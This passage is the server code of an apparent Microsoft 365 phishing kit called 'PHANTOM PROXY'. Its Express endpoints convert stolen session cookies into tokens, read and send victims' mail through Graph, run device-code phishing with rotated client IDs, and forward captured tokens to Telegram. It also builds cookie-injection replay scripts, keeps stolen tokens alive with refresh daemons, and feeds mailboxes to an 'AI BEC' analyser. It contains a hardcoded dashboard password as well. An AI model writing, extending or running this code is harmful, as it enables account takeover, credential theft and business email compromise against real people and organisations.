                source: 'esctx_conversion',
                id_token: result.id_token
            });
        }
        res.json({ success: true, data: result });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/convert/sccauth-to-token', async (req, res) => {
    const { sccauth, resource = 'MSGraph' } = req.body;
    if (!sccauth) {
        return res.status(400).json({ error: 'SCCAUTH cookie required' });
    }

    try {
        const result = await conversionEngine.sccauthToJWT(sccauth, resource);
        if (result.access_token) {
            vault.tokens.push({
                type: 'access',
                value: result.access_token,
                refresh_token: result.refresh_token,
                username: result.id_token ? 'sccauth_user' : 'Unknown',
                timestamp: new Date().toISOString(),
                source: 'sccauth_conversion'
            });
        }
        res.json({ success: true, data: result });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ RECON ENDPOINTS ──
dashApp.post('/api/recon', async (req, res) => {
    const { accessToken, refreshToken, email } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });

    try {
        const graph = new GraphClient(accessToken);
        const [profile, inbox, sent, contacts, events, manager, directReports, org] = await Promise.all([
            graph.getUserProfile(),
            graph.getInbox(50),
            graph.getSentItems(50),
            graph.getContacts(),
            graph.getEvents(),
            graph.getManager().catch(() => null),
            graph.getDirectReports().catch(() => null),
            graph.getOrganization().catch(() => null)
        ]);

        res.json({
            success: true,
            email: email || profile.mail || profile.userPrincipalName,
            profile,
            inbox: inbox?.value || [],
            sent: sent?.value || [],
            contacts: contacts?.value || [],
            events: events?.value || [],
            manager,
            directReports: directReports?.value || [],
            organization: org?.value?.[0] || null
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/ai/analyze', async (req, res) => {
    const { accessToken, refreshToken, email, groqApiKey } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
    if (!groqApiKey) return res.status(400).json({ error: 'Groq API key required' });

    try {
        const engine = new AIBECEngine(groqApiKey);
        const result = await engine.runFullAnalysis(accessToken, refreshToken, email);
        res.json({ success: true, ...result });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ WEBMAIL ENDPOINTS ──
dashApp.post('/api/webmail/folders', async (req, res) => {
    const { accessToken } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });

    try {
        const graph = new GraphClient(accessToken);
        const folders = await graph.getMailFolders();
        res.json({ success: true, folders: folders.value || [] });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/webmail/emails', async (req, res) => {
    const { accessToken, folderId = 'inbox', limit = 50, skip = 0 } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });

    try {
        const graph = new GraphClient(accessToken);
        let endpoint;
        if (folderId === 'inbox') {
            endpoint = `/mailFolders/inbox/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
        } else if (folderId === 'sent') {
            endpoint = `/mailFolders/sentitems/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
        } else {
            endpoint = `/mailFolders/${folderId}/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
        }
        const emails = await graph.get(endpoint);
        res.json({ success: true, emails: emails.value || [], count: emails.value?.length || 0 });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/webmail/email', async (req, res) => {
    const { accessToken, messageId } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
    if (!messageId) return res.status(400).json({ error: 'Message ID required' });

    try {
        const graph = new GraphClient(accessToken);
        const email = await graph.get(`/messages/${messageId}?$select=id,subject,sender,toRecipients,ccRecipients,bccRecipients,receivedDateTime,body,isRead,hasAttachments,importance,conversationId`);
        res.json({ success: true, email });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/webmail/send', async (req, res) => {
    const { accessToken, to, subject, body, replyToId, forwardFromId } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
    if (!to || !subject || !body) return res.status(400).json({ error: 'To, subject, and body required' });

    try {
        const graph = new GraphClient(accessToken);
        const emailData = {
            message: {
                subject: subject,
                body: { content: body, contentType: 'HTML' },
                toRecipients: to.map(email => ({ emailAddress: { address: email } }))
            }
        };
        if (replyToId) emailData.message.conversationId = replyToId;
        if (forwardFromId) emailData.message.forwardFrom = { id: forwardFromId };
        const result = await graph.post('/me/sendMail', emailData);
        res.json({ success: true, result });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/webmail/search', async (req, res) => {
    const { accessToken, query, folderId = 'inbox', limit = 50 } = req.body;
    if (!accessToken) return res.status(400).json({ error: 'Access token required' });
    if (!query) return res.status(400).json({ error: 'Search query required' });

    try {
        const graph = new GraphClient(accessToken);
        const searchUrl = folderId === 'inbox'
            ? `/mailFolders/inbox/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`
            : `/mailFolders/${folderId}/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`;
        const results = await graph.get(searchUrl);
        res.json({ success: true, emails: results.value || [] });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ VISITS ENDPOINTS ──
dashApp.get('/api/visits', (req, res) => {
    try {
        if (!fs.existsSync(VISITS_LOG_FILE)) {
            return res.json({ visits: [], total: 0, uniqueIPs: 0, today: 0, week: 0 });
        }
        const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const visits = lines.map(line => JSON.parse(line));
        visits.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
        const now = new Date();
        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
        res.json({
            visits: visits.slice(0, 100),
            total: visits.length,
            uniqueIPs: uniqueIPs,
            today: todayVisits.length,
            week: weekVisits.length
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/visits/stats', (req, res) => {
    try {
        if (!fs.existsSync(VISITS_LOG_FILE)) {
            return res.json({ total: 0, uniqueIPs: 0, today: 0, week: 0 });
        }
        const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const visits = lines.map(line => JSON.parse(line));
        const now = new Date();
        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
        res.json({
            total: visits.length,
            uniqueIPs: uniqueIPs,
            today: todayVisits.length,
            week: weekVisits.length
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ ANALYTICS ENDPOINTS ──
dashApp.get('/api/analytics', (req, res) => {
    try {
        let visits = [];
        let captures = [];
        if (fs.existsSync(VISITS_LOG_FILE)) {
            const content = fs.readFileSync(VISITS_LOG_FILE, 'utf-8');
            const lines = content.split('\n').filter(line => line.trim());
            visits = lines.map(line => JSON.parse(line));
        }
        const logFiles = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        captures = logFiles.map(f => {
            const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
            return { file: f, modified: stat.mtime, size: stat.size };
        });
        const now = new Date();
        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        const weekAgo = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000);
        const monthAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000);
        const todayVisits = visits.filter(v => new Date(v.timestamp) >= today);
        const weekVisits = visits.filter(v => new Date(v.timestamp) >= weekAgo);
        const monthVisits = visits.filter(v => new Date(v.timestamp) >= monthAgo);
        const todayCaptures = captures.filter(c => c.modified >= today);
        const weekCaptures = captures.filter(c => c.modified >= weekAgo);
        const monthCaptures = captures.filter(c => c.modified >= monthAgo);
        const conversionRate = {
            today: todayVisits.length > 0 ? (todayCaptures.length / todayVisits.length * 100).toFixed(1) : 0,
            week: weekVisits.length > 0 ? (weekCaptures.length / weekVisits.length * 100).toFixed(1) : 0,
            month: monthVisits.length > 0 ? (monthCaptures.length / monthVisits.length * 100).toFixed(1) : 0,
            total: visits.length > 0 ? (captures.length / visits.length * 100).toFixed(1) : 0
        };
        const dailyCaptures = {};
        const dailyVisits = {};
        for (let i = 6; i >= 0; i--) {
            const d = new Date(now.getTime() - i * 24 * 60 * 60 * 1000);
            const key = d.toDateString();
            dailyCaptures[key] = 0;
            dailyVisits[key] = 0;
        }
        captures.forEach(c => {
            const key = new Date(c.modified).toDateString();
            if (dailyCaptures.hasOwnProperty(key)) dailyCaptures[key]++;
        });
        visits.forEach(v => {
            const key = new Date(v.timestamp).toDateString();
            if (dailyVisits.hasOwnProperty(key)) dailyVisits[key]++;
        });
        const domains = {};
        visits.forEach(v => {
            const url = v.url || '';
            const match = url.match(/https?:\/\/([^\/]+)/);
            if (match) {
                const domain = match[1];
                domains[domain] = (domains[domain] || 0) + 1;
            }
        });
        const topDomains = Object.entries(domains)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 5)
            .map(([domain, count]) => ({ domain, count }));
        const uniqueIPs = new Set(visits.map(v => v.ip)).size;
        res.json({
            success: true,
            analytics: {
                visits: {
                    total: visits.length,
                    today: todayVisits.length,
                    week: weekVisits.length,
                    month: monthVisits.length
                },
                captures: {
                    total: captures.length,
                    today: todayCaptures.length,
                    week: weekCaptures.length,
                    month: monthCaptures.length
                },
                conversionRate,
                uniqueIPs,
                dailyCaptures,
                dailyVisits,
                topDomains,
                captureTimeline: captures.map(c => ({
                    date: c.modified,
                    file: c.file,
                    size: c.size
                }))
            }
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ TOKEN REPLAY ENDPOINTS ──
dashApp.get('/api/replay/:filename', (req, res) => {
    const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Log not found' });

    try {
        const content = fs.readFileSync(filePath, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        let allCookies = [];
        let targetDomain = null;
        let accessToken = null;
        let refreshToken = null;

        for (const line of lines) {
            try {
                const entry = JSON.parse(line);
                const iv = Object.keys(entry)[0];
                const encrypted = entry[iv];
                const decrypted = decryptData(encrypted, iv);
                const obj = JSON.parse(decrypted);

                if (!targetDomain && obj.proxyRequestURL) {
                    try {
                        const url = new URL(obj.proxyRequestURL);
                        targetDomain = url.hostname;
                    } catch (e) {}
                }

                const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
                if (setCookie) {
                    const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
                    for (const cookie of cookieArray) {
                        const [nameValue] = cookie.split(';');
                        if (nameValue) allCookies.push(nameValue.trim());
                    }
                }

                const body = obj.proxyRequestBody;
                if (body) {
                    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                    const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                    const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                    if (accessMatch) accessToken = decodeURIComponent(accessMatch[1]);
                    if (refreshMatch) refreshToken = decodeURIComponent(refreshMatch[1]);
                }
            } catch (e) {}
        }

        if (allCookies.length === 0 && !accessToken) {
            return res.status(404).json({ error: 'No cookies or tokens found' });
        }

        const replayScript = `
            (function() {
                const cookies = ${JSON.stringify(allCookies)};
                const targetDomain = ${JSON.stringify(targetDomain || 'login.microsoftonline.com')};
                const accessToken = ${JSON.stringify(accessToken)};
                const refreshToken = ${JSON.stringify(refreshToken)};
                
                cookies.forEach(c => {
                    document.cookie = c + '; path=/; domain=' + targetDomain + '; Secure; SameSite=None';
                });
                
                let msg = '🍪 ' + cookies.length + ' cookies injected.';
                if (accessToken) {
                    msg += '\\n🔑 Access token: ' + accessToken.slice(0, 20) + '...';
                    localStorage.setItem('evil_token', accessToken);
                }
                if (refreshToken) {
                    msg += '\\n🔄 Refresh token: ' + refreshToken.slice(0, 20) + '...';
                }
                alert(msg);
                window.location.href = 'https://' + targetDomain;
            })();
        `;

        res.json({
            success: true,
            cookieCount: allCookies.length,
            targetDomain: targetDomain || 'login.microsoftonline.com',
            hasAccessToken: !!accessToken,
            hasRefreshToken: !!refreshToken,
            replayScript: replayScript,
            cookieString: allCookies.join('; ')
        });

    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ MAIN APP ──
const app = express();

app.use(corsMiddleware);
app.use(antiBotMiddleware);
app.use(botTrapMiddleware);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ── ✅ WEBMAIL ROUTE ──
app.get('/webmail', (req, res) => {
    const filePath = path.join(__dirname, 'public', 'webmail.html');
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.send(`<!DOCTYPE html><html><head><title>📧 PHANTOM Webmail</title></head><body><h1>📧 PHANTOM Webmail</h1><p>Please create public/webmail.html</p><a href="/dash">Go to Dashboard</a></body></html>`);
    }
});

// ── ✅ DEVICE PAGE ──
app.get('/device', (req, res) => {
    const filePath = path.join(__dirname, 'public', 'device_code.html');
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.send(`<!DOCTYPE html><html><head><title>Device Login</title></head><body><h1>🔐 Device Login</h1><p>Please create public/device_code.html</p><a href="/dash">Go to Dashboard</a></body></html>`);
    }
});

// ── ✅ DEVICE CODE REQUEST ──
app.post('/device/request', async (req, res) => {
    if (!axios) {
        return res.status(500).json({ error: 'axios not installed' });
    }
    try {
        logInfo('📱 Device code requested');
        const clientId = getRandomClientId();
        const userAgent = getRandomUserAgent();
        await randomDelay(300, 800);

        const url = 'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode';
        const params = new URLSearchParams({
            client_id: clientId,
            scope: 'https://graph.microsoft.com/.default offline_access'
        });

        const config = getAxiosConfig();
        config.headers['Content-Type'] = 'application/x-www-form-urlencoded';

        const response = await retry(async () => {
            return await axios.post(url, params, config);
        }, 3, 1500, 2);

        const data = response.data;
        logInfo(`✅ Device code obtained: ${data.user_code}`);

        const newFlow = {
            device_code: data.device_code,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            verification_uri_complete: data.verification_uri_complete || data.verification_uri,
            expires_in: data.expires_in,
            interval: data.interval,
            status: 'pending',
            created: new Date().toISOString(),
            approved: null,
            username: null,
            access_token: null,
            refresh_token: null,
            id_token: null,
            prt: null,
            manual_submitted: false,
            client_id: clientId,
            user_agent: userAgent,
            session_id: crypto.randomBytes(16).toString('hex'),
            token_type: 'Pending'
        };
        deviceFlows.push(newFlow);
        saveDeviceFlows(deviceFlows);

        const message = `
📱 **Device Code Phishing**
🆔 **User Code:** \`${data.user_code}\`
🔗 **Verification URI:** ${data.verification_uri}
⏱️ **Expires in:** ${data.expires_in} seconds
📱 **Client:** ${clientId}
**Code:** \`${data.user_code}\`
        `;
        
        // Queue the message
        telegramQueue.push({
            timestamp: Date.now(),
            message: message
        });
        saveTelegramQueue();

        res.json(data);
    } catch (error) {
        logError('Device code error:', error.response?.data || error.message);
        res.status(500).json(error.response?.data || { error: error.message });
    }
});

// ── ✅ DEVICE TOKEN POLLING ──
app.post('/device/token', async (req, res) => {
    if (!axios) {
        return res.status(500).json({ error: 'axios not installed' });
    }
    const { device_code } = req.body;
    if (!device_code) {
        return res.status(400).json({ error: 'device_code required' });
    }
    try {
        logInfo(`🔄 Polling for token: ${device_code}`);
        const flow = deviceFlows.find(f => f.device_code === device_code);
        const clientId = flow?.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
        const userAgent = getRandomUserAgent();
        await randomDelay(200, 600);

        const url = 'https://login.microsoftonline.com/organizations/oauth2/v2.0/token';
        const params = new URLSearchParams({
            client_id: clientId,
            device_code: device_code,
            grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
        });

        const config = getAxiosConfig();
        config.headers['Content-Type'] = 'application/x-www-form-urlencoded';

        const response = await retry(async () => {
            return await axios.post(url, params, config);
        }, 3, 1500, 2);

        const tokens = response.data;
        logInfo('✅ Tokens obtained!');

        const tokenType = tokens.access_token ? 'Access Token' :
            tokens.refresh_token ? 'Refresh Token' :
            tokens.id_token ? 'ID Token' : 'Unknown';

        let username = 'Unknown';
        if (tokens.id_token) {
            try {
                const parts = tokens.id_token.split('.');
                if (parts.length === 3) {
                    const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                    username = payload.email || payload.preferred_username || payload.upn || 'Unknown';
                }
            } catch (e) {}
        } else if (tokens.access_token) {
            try {
                const parts = tokens.access_token.split('.');
                if (parts.length === 3) {
                    const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                    username = payload.email || payload.preferred_username || payload.upn || 'Unknown';
                }
            } catch (e) {}
        }

        if (flow) {
            flow.status = 'approved';
            flow.approved = new Date().toISOString();
            flow.access_token = tokens.access_token;
            flow.refresh_token = tokens.refresh_token;
            flow.id_token = tokens.id_token;
            flow.token_type = tokenType;
            flow.username = username;
            saveDeviceFlows(deviceFlows);
        }

        // Send to Telegram
        sendToTelegramClean({
            sessionId: flow?.session_id || 'device_flow',
            proxyRequestBody: JSON.stringify(tokens),
            proxyResponseBody: JSON.stringify(tokens)
        });

        res.json(tokens);
    } catch (error) {
        if (error.response?.data?.error === 'authorization_pending') {
            logInfo('⏳ Still waiting for approval...');
            res.status(400).json({ error: 'authorization_pending' });
        } else if (error.response?.data?.error === 'expired_token') {
            logInfo('⏰ Code expired');
            const flow = deviceFlows.find(f => f.device_code === device_code);
            if (flow) flow.status = 'expired';
            saveDeviceFlows(deviceFlows);
            res.status(400).json({ error: 'expired_token' });
        } else {
            logError('Token error:', error.response?.data || error.message);
            res.status(500).json({ error: error.response?.data?.error_description || error.message });
        }
    }
});

// ── ✅ MOUNT DASHBOARD ──
app.use('/dash', dashApp);

// ── ✅ PROXY ROUTE ──
app.use((req, res) => {
    if (!req.path.startsWith('/dash') && !req.path.startsWith('/device') && !req.path.startsWith('/mfa') && !req.path.startsWith('/webmail') && !req.path.startsWith('/verify')) {
        proxyServer.emit('request', req, res);
    }
});

// ── ✅ START AUTO-REFRESH DAEMONS ──
refreshTokensDaemon();
prtRefreshDaemon();

// ============================================================
// 🗃️ INITIALIZE CACHE AND QUEUE
// ============================================================
global._cache = new CacheManager(300000);
loadTelegramQueue();

// ============================================================
// 🧹 PERIODIC CACHE CLEANUP
// ============================================================
setInterval(() => {
    if (global._cache) {
        global._cache.clean();
        const stats = global._cache.getStats();
        logDebug(`Cache cleaned, stats: ${JSON.stringify(stats)}`);
    }
}, 60000);

// ============================================================
// 🛑 GRACEFUL SHUTDOWN
// ============================================================
function setupGracefulShutdown(server, wss) {
    const signals = ['SIGINT', 'SIGTERM', 'SIGQUIT'];

    for (const signal of signals) {
        process.on(signal, async () => {
            logInfo(`🛑 Received ${signal}, shutting down gracefully...`);

            server.close(() => {
                logInfo('✅ HTTP server closed');
            });

            if (wss) {
                for (const client of wss.clients) {
                    client.close();
                }
                logInfo('✅ WebSocket connections closed');
            }

            saveTelegramQueue();
            saveDeviceFlows(deviceFlows);
            logInfo('✅ Graceful shutdown complete');
            process.exit(0);
        });
    }
}

// ── ✅ START SERVER ──
const PORT = process.env.PORT || 3000;

const server = app.listen(PORT, '0.0.0.0', () => {
    logInfo(`✅ PHANTOM PROXY v8.1 ULTIMATE running on port ${PORT}`);
    logInfo(`🔐 Dashboard: /dash (auth: svrpsdev/Cozysarps18!)`);
    logInfo(`📱 Device Code: /device`);
    logInfo(`📧 Webmail: /webmail`);
    logInfo(`🟣 PRT Vault: /dash#prt`);
    logInfo(`🔄 PRT Exchange: /api/prt/exchange`);
    logInfo(`🔄 Token Refresh Daemon: Active (every 30 min)`);
    logInfo(`🟣 PRT Auto-Refresh Daemon: Active (every 60 min)`);
    logInfo(`🔄 Client Rotation: ${CLIENT_IDS.length} clients loaded`);
    logInfo(`🔄 UA Rotation: ${USER_AGENTS.length} user-agents loaded`);
    logInfo(`📤 Telegram Queue: ${telegramQueue.length} pending`);
    logInfo(`🛡️ Anti-Bot: REMOVED (as requested)`);
    logInfo(`🔄 esctx/sccauth → JWT: Active`);
    logInfo(`✅ Token Health-Check: Active`);
    logInfo(`✅ Redirect interception: ACTIVE (rewrites 3xx Location headers)`);
    logInfo('✅ All features integrated — Complete Ultimate Edition');
});

// ── ✅ WEBSOCKET SUPPORT ──
let wss = null;
if (WebSocket) {
    wss = new WebSocket.Server({ server });
    let clients = [];
    wss.on('connection', (ws) => {
        clients.push(ws);
        ws.on('close', () => {
            clients = clients.filter(c => c !== ws);
        });
    });
    try {
        fs.watch(LOGS_DIRECTORY, (eventType, filename) => {
            if (filename && filename.endsWith('.log')) {
                clients.forEach(client => {
                    if (client.readyState === WebSocket.OPEN) {
                        client.send(JSON.stringify({ type: 'newLog', file: filename }));
                    }
                });
            }
        });
    } catch (err) {
        logWarn('File watching not available');
    }
}

// ── ✅ GRACEFUL SHUTDOWN SETUP ──
setupGracefulShutdown(server, wss);

// ── ✅ ERROR HANDLING ──
process.on('uncaughtException', (err) => {
    logError('Uncaught Exception:', err.message);
    logError(err.stack);
});

process.on('unhandledRejection', (err) => {
    logError('Unhandled Rejection:', err);
});

logInfo('✅ PHANTOM PROXY v8.1 ULTIMATE startup complete!');
logInfo('🔥 Everything combined — Proxy, Dashboard, PRT, Graph API, Device Code, AI BEC, Conversions, Health-Check, Auto-Refresh, Telegram Queue, and Redirect Interception.');
